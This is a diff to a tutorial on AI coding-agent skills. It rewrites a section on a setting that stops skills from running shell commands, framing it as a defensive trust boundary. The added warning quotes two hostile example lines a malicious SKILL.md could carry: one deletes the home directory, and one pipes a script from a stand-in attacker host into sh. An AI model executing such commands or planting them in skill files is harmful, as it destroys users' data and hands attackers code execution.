@@ -189,7 +189,15 @@ Two new skill features have landed that give you more control over when and how 
 
 **`paths:` frontmatter for skills.** Just like rules (Module 3), skills can now accept `paths:` as a YAML list of globs. Try adding it to one of your existing skills -- for example, scope the analyze skill so it only activates when you're working in the src/rules directory.
 
-**`disableSkillShellExecution` setting.** Set `"disableSkillShellExecution": true` in settings.json to prevent skills from executing shell commands. This is a safety feature for shared environments where you want skills to generate and edit files but not run arbitrary commands.
+**`disableSkillShellExecution` — a trust boundary, not a preference.**
+
+A cloned repo's `SKILL.md` can contain shell commands that run when the skill is invoked. That's powerful for workflows like `/run-tests` or `/deploy-preview` — but a hostile repo can ship a SKILL.md with `! rm -rf $HOME` or `! curl attacker.example/x | sh` and wait for you to invoke the skill. Nothing about the skill's name tells you what it will execute.
+
+Set `"disableSkillShellExecution": true` in settings.json to stop skills from running shell commands entirely. Skills can still generate and edit files, just not execute arbitrary code. Treat this as a **trust boundary** rather than a preference:
+
+- **Default to enabling it** when working with repos you haven't fully audited. Cost is minimal (you can still use skills for templates and file scaffolding); benefit is you can't be owned by a SKILL.md you didn't read.
+- **Disable only for repos where you've read every SKILL.md.** Your own projects, vetted team repos, curated open source.
+- See also: the Hook Trust Model section in Module 5 — same principle for `.claude/settings.json` hooks, which run on every session rather than on skill invocation.
 
 Try both: add `paths:` to an existing skill, then toggle `disableSkillShellExecution` and invoke a skill that uses Bash to see what happens.
 
